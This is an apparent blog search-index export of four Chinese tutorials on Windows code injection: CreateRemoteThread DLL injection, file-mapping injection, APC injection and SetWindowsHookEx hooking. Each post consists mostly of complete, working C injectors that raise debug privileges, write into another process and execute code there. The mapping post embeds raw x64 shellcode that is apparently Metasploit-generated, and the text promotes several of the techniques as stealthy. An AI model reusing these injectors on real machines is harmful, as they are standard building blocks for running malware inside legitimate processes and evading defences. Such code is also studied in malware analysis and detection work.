<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CreateRemoteThread Inject</title>
    <url>/2022/06/23/%E4%B8%80%E3%80%81%E8%BF%9C%E7%A8%8BDll%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<ul>
<li>原理以及步骤：</li>
</ul>
<ol>
<li>使用AdjustTokenPrivileges函数对当前进程进行提权</li>
<li>使用Process32First函数取得目标进程ID</li>
<li>使用OpenProcess函数打开目标进程</li>
<li>使用VirtualAllocEx函数为目标进程分配空间</li>
<li>使用WriteProcessMemory函数写入Dll路径</li>
<li>使用GetProcAddress函数取得LoadLibrary函数地址</li>
<li>使用CreateRemoteThread函数创建远程线程执行LoadLibrary</li>
</ol>
<ul>
<li>具体实现过程：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">AdjustPrivilege</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE TheToken = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (::OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;TheToken))</span><br><span class="line">	&#123;</span><br><span class="line">		TOKEN_PRIVILEGES tkp;</span><br><span class="line">		LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tkp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">		tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">		tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">		AdjustTokenPrivileges(TheToken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">GetProcessID</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ErrorCode;</span><br><span class="line">	<span class="type">char</span> szExeName[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESSENTRY32 pe;</span><br><span class="line">	ZeroMemory(&amp;pe, <span class="keyword">sizeof</span>(pe));</span><br><span class="line">	pe.dwSize = <span class="keyword">sizeof</span>(pe);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入程序名称：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, szExeName);</span><br><span class="line">	HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		ErrorCode = GetLastError();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;调用失败,错误码：%d\n&quot;</span>, ErrorCode);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	BOOL bRet = ::Process32First(hSnap, &amp;pe);</span><br><span class="line">	<span class="keyword">while</span> (bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(pe.szExeFile, szExeName) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;进程名称：%s\n进程ID：%u\n&quot;</span>, pe.szExeFile, (<span class="type">unsigned</span> <span class="type">int</span>)pe.th32ProcessID);</span><br><span class="line">			<span class="keyword">return</span> pe.th32ProcessID;</span><br><span class="line">		&#125;</span><br><span class="line">		bRet = ::Process32Next(hSnap, &amp;pe);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwProcessId;</span><br><span class="line">	dwProcessId=GetProcessID();</span><br><span class="line">	<span class="type">char</span> *dllpath = (<span class="type">char</span>*)<span class="string">&quot;C:\\Users\\Lenovo\\source\\repos\\Dll\\x64\\Debug\\Dll.dll&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> (dwProcessId == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;未找到，请重试\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	AdjustPrivilege();</span><br><span class="line"><span class="comment">//打开目标进程取得句柄</span></span><br><span class="line">	HANDLE hTarget = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);</span><br><span class="line">	<span class="keyword">if</span> (hTarget == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;打开错误\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//为目标进程分配大小用Dllpath大小的内存空间</span></span><br><span class="line">	LPVOID paraAddr=::VirtualAllocEx(hTarget, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(dllpath) + <span class="number">1</span>, MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (paraAddr == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;空间分配错误\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//将DllPath写入内存空间</span></span><br><span class="line">	<span class="keyword">if</span> (!::WriteProcessMemory(hTarget, paraAddr, dllpath, <span class="built_in">strlen</span>(dllpath) + <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;写入内存失败\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//取得LoadLibrary函数地址</span></span><br><span class="line">	HINSTANCE LibHandle = ::LoadLibrary(<span class="string">&quot;Kernel32&quot;</span>);</span><br><span class="line">	UINT64  ProcAdd = (UINT64)GetProcAddress(LibHandle, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	DWORD threadid = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//创建远程线程</span></span><br><span class="line">	HANDLE hThread = ::CreateRemoteThread(hTarget, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)ProcAdd, paraAddr, <span class="number">0</span>, &amp;threadid);</span><br><span class="line">	::CloseHandle(hTarget);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>效果如下</li>
</ul>
<p><img src="https://s3.bmp.ovh/imgs/2022/06/23/9f02f1d55207c1d1.png" alt="                                                                             注入成功"></p>
<pre><code>                                                                         注入成功
</code></pre>
]]></content>
      <tags>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Mapping Injection</title>
    <url>/2022/06/25/%E4%BA%8C%E3%80%81Mapping%20Injection/</url>
    <content><![CDATA[<ul>
<li>简介:通过内存映射的姿势来进行注入，简单快捷，能够有效增加隐蔽性</li>
<li>原理以及步骤：</li>
</ul>
<ol>
<li>使用CreateFileMapping函数创建一个共享内存对象句柄</li>
<li>使用MapViewOfFile函数共享内存映射到调用的进程</li>
<li>复制需要注入的代码到共享的内存空间</li>
<li>使用MapViewOfFile2函数将共享内存映射到远程进程（该远程句柄又OpenProcess函数得到）</li>
<li>使用CreateRemoteThread函数创建远程线程执行代码</li>
</ol>
<ul>
<li>具体实现过程：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;OneCore.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">UCHAR Code[] = &#123; <span class="string">&quot;\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x2b\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13&quot;</span></span><br><span class="line"><span class="string">&quot;\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x48\x65\x6c\x6c\x6f&quot;</span></span><br><span class="line"><span class="string">&quot;\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d\x65\x73&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x61\x67\x65\x42\x6f\x78\x00&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="number">0</span>, <span class="keyword">sizeof</span>(Code), <span class="literal">NULL</span>);</span><br><span class="line">	LPVOID MapAddr = MapViewOfFile(hMapping, FILE_MAP_WRITE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(Code));</span><br><span class="line">	<span class="built_in">memcpy</span>(MapAddr, Code, <span class="keyword">sizeof</span>(Code));</span><br><span class="line">	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <span class="number">13692</span>);</span><br><span class="line">	LPVOID RemoteMapAddr = MapViewOfFile2(hMapping, hProc, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, PAGE_EXECUTE_READ);</span><br><span class="line">	HANDLE hRemoteThread = CreateRemoteThread(hProc, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)RemoteMapAddr,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">	UnmapViewOfFile(hMapping);</span><br><span class="line">	CloseHandle(hProc);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>APC Inject（用户层）</title>
    <url>/2022/06/27/%E4%B8%89%E3%80%81APC%20Inject/</url>
    <content><![CDATA[<ul>
<li>简介：APC注入可以让一个线程在它正常的执行路径运行之前执行一些其它的代码，每一个线程都有一个附加的APC队列，它们在线程处于可警告的时候才被处理</li>
<li>原理以及步骤：</li>
</ul>
<ol>
<li>提权</li>
<li>使用OpenProcess函数取得目标进程句柄</li>
<li>使用VirtualAllocEx函数为目标进程分配空间</li>
<li>使用WriteProcessMemory函数写入DLL路径</li>
<li>使用OpenPThread函数取得目标线程句柄</li>
<li>使用QueueUserAPC函数向线程插入APC</li>
</ol>
<ul>
<li>具体实现过程：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">GetProcessID</span><span class="params">(WCHAR szProcessName[])</span></span><br><span class="line">&#123;</span><br><span class="line">	PROCESSENTRY32 pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(pe32);</span><br><span class="line">	HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateToolhelp32Snapshot调用失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	BOOL bMore = ::Process32First(hProcessSnap, &amp;pe32);</span><br><span class="line">	<span class="keyword">while</span> (bMore)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span>*)szProcessName, (<span class="type">const</span> <span class="type">char</span>*)pe32.szExeFile) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;进程名称：%ls\n&quot;</span>, pe32.szExeFile);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;进程ID：%d\n&quot;</span>, pe32.th32ProcessID);</span><br><span class="line">			<span class="keyword">return</span> pe32.th32ProcessID;</span><br><span class="line">		&#125;</span><br><span class="line">		bMore = ::Process32Next(hProcessSnap, &amp;pe32);</span><br><span class="line">	&#125;</span><br><span class="line">	::CloseHandle(hProcessSnap);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">GetThreadID</span><span class="params">(DWORD dwProcessId)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ErrorCode;</span><br><span class="line">	THREADENTRY32 te;</span><br><span class="line">	ZeroMemory(&amp;te, <span class="keyword">sizeof</span>(te));</span><br><span class="line">	te.dwSize = <span class="keyword">sizeof</span>(te);</span><br><span class="line">	HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		ErrorCode = GetLastError();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;调用失败,错误码：%d\n&quot;</span>, ErrorCode);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	BOOL bRet = ::Thread32First(hSnap, &amp;te);</span><br><span class="line">	<span class="keyword">while</span> (bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (te.th32OwnerProcessID == dwProcessId)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;线程ID：%u\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)te.th32ThreadID);</span><br><span class="line">			<span class="keyword">return</span> te.th32ThreadID;</span><br><span class="line">		&#125;</span><br><span class="line">		bRet = ::Thread32Next(hSnap, &amp;te);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">AdjustPrivilege</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE TheToken = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (::OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;TheToken))</span><br><span class="line">	&#123;</span><br><span class="line">		TOKEN_PRIVILEGES tkp;</span><br><span class="line">		LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tkp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">		tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">		tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">		AdjustTokenPrivileges(TheToken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD ProcessID = <span class="number">0</span>;</span><br><span class="line">	DWORD ThreadID = <span class="number">0</span>;</span><br><span class="line">	LPVOID hAddr = <span class="literal">NULL</span>;</span><br><span class="line">	WCHAR ProcessName[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">char</span>*DllName = (<span class="type">char</span>*)<span class="string">&quot;C:\\Users\\Lenovo\\source\\repos\\InjectDll\\x64\\Debug\\Inject.dll&quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入程序名称：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%ls&quot;</span>, ProcessName);</span><br><span class="line">	ProcessID = ::GetProcessID(ProcessName);</span><br><span class="line">	<span class="keyword">if</span> (ProcessID == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;未找到指定进程ID&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	AdjustPrivilege();</span><br><span class="line">	HANDLE hTar = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessID);</span><br><span class="line">	<span class="keyword">if</span> (hTar)</span><br><span class="line">	&#123;</span><br><span class="line">		hAddr = ::VirtualAllocEx(hTar, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(DllName) + <span class="number">1</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">		<span class="keyword">if</span> (hAddr)</span><br><span class="line">		&#123;</span><br><span class="line">			::WriteProcessMemory(hTar, hAddr, (LPVOID)DllName, <span class="built_in">strlen</span>(DllName) + <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	CloseHandle(hTar);</span><br><span class="line">	ThreadID = ::GetThreadID(ProcessID);</span><br><span class="line">	HANDLE hThread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadID);</span><br><span class="line">	<span class="keyword">if</span> (hThread)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (QueueUserAPC((PAPCFUNC)LoadLibraryA, hThread, (ULONG_PTR)hAddr))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;APC Inject!!!&quot;</span>);</span><br><span class="line">			CloseHandle(hThread);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Error!!!&quot;</span>);</span><br><span class="line">			CloseHandle(hThread);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SetWindowsHookEx Inject</title>
    <url>/2022/06/29/%E5%9B%9B%E3%80%81SetWindowsHookEx%20Inject%20/</url>
    <content><![CDATA[<ul>
<li>简介：极为简单和隐蔽的注入方法</li>
<li>原理以及步骤：</li>
</ul>
<ol>
<li>创建一个DLL文件</li>
<li>使用SetWinodwsHookEx函数创建一个钩子(可指定可全局),类型看自己需求</li>
</ol>
<ul>
<li>具体实现过程：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WIN32_LEAN_AND_MEAN </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line">HHOOK g_hook = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">GetProcessID</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	PROCESSENTRY32 pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(pe32);</span><br><span class="line">	HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	BOOL bMore = ::Process32First(hProcessSnap, &amp;pe32);</span><br><span class="line">	<span class="keyword">while</span> (bMore)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;notepad.exe&quot;</span>, pe32.szExeFile) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> pe32.th32ProcessID;</span><br><span class="line">		&#125;</span><br><span class="line">		bMore = ::Process32Next(hProcessSnap, &amp;pe32);</span><br><span class="line">	&#125;</span><br><span class="line">	::CloseHandle(hProcessSnap);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">GetThreadID</span><span class="params">(DWORD dwProcessId)</span></span><br><span class="line">&#123;</span><br><span class="line">	THREADENTRY32 te;</span><br><span class="line">	ZeroMemory(&amp;te, <span class="keyword">sizeof</span>(te));</span><br><span class="line">	te.dwSize = <span class="keyword">sizeof</span>(te);</span><br><span class="line">	HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	BOOL bRet = ::Thread32First(hSnap, &amp;te);</span><br><span class="line">	<span class="keyword">while</span> (bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (te.th32OwnerProcessID == dwProcessId)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> te.th32ThreadID;</span><br><span class="line">		&#125;</span><br><span class="line">		bRet = ::Thread32Next(hSnap, &amp;te);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LRESULT <span class="title function_">HookProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (wParam == <span class="number">0x49</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">&quot;Success Inject!&quot;</span>, <span class="string">&quot;Tips&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">return</span> CallNextHookEx(g_hook, nCode, wParam, lParam);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> CallNextHookEx(g_hook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">SetHook</span><span class="params">(HMODULE hModule)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD ProcessID = GetProcessID();</span><br><span class="line">	DWORD ThreadID = GetThreadID(ProcessID);</span><br><span class="line">	g_hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)HookProc, hModule, ThreadID);</span><br><span class="line">	<span class="keyword">if</span> (g_hook)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">		SetHook(hModule);</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">&quot;Running!&quot;</span>, <span class="string">&quot;Tips&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="comment">//在此处添加你想实现的代码//</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		UnhookWindowsHookEx(g_hook);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>效果图如下，当随意按下程序某个键时，系统会强制将我们编写的DLL加载到目标空间</li>
</ul>
<p><img src="https://s3.bmp.ovh/imgs/2022/06/27/39413f4d0fd74f0b.png"></p>
]]></content>
      <tags>
        <tag>注入</tag>
      </tags>
  </entry>
</search>
